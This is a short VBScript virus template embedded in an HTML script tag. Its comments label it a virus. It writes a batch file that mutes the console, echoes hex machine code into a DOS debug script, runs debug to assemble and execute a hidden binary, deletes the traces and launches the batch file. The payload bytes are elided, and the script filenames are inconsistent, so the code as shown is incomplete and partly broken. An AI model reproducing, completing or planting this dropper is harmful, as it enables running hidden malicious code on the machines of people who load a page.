 <script Language="VBScript"><!--
 ' Ä Virus script start here:
 Dim a,f,s
 Set a = CreateObject("Wscript.Shell")
 Set f = CreateObject("Scripting.FileSystemObject")
 Set s = f.CreateTextFile("ultras.bat", 2, False)
 ' Ä create ultras.bat file and let's write down theree debug script :
 s.WriteLine "@echo off"
 s.WriteLine "ctty nul"
 ' Ä u debug script start here : 
 s.WriteLine "ECHO E0100 BA 4B 02 BA 58 02 E8 54 00 BA ... etc >>virus.scr"
 s.WriteLine "ECHO u debug script ............................ >>virus.scr"
 ' Ä End Debug script :
 s.WriteLine "ECHO g >>fire.scr"
 s.WriteLine "ECHO q >>fire.scr"
 s.WriteLine "debug<fire.scr"
 s.WriteLine "del fire.scr"
 s.WriteLine "ctty con"
 ' Ä close file :
 s.Close
 ' Ä Execute ultras.bat :
 a.Run ("ultras.bat")
 --></script>
 ' Ä end virus script